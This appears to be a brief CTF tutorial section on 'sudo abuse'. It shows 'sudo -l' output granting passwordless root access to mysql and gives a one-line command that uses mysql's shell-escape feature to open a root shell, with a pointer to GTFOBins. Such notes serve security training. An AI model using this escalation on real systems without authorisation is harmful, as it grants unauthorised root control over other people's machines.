## Sudo Abuse

Sudo abuse is one of the most common method in CTF.

```
nullbr41n@demo:~$ sudo -l
..........................:
    env_reset, mail_badpass, secure_path=....................

User nullbr41n may run the following commands on demo:
    (root) NOPASSWD: /usr/bin/mysql
```

In such senario you could abuse mysql's command execute feature (`-e`) in conjunction with mysqls feature of executing shell command (`\!`)


```
sudo mysql -e '\! /bin/sh'
```

[GTFOBins](https://gtfobins.github.io/) is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.
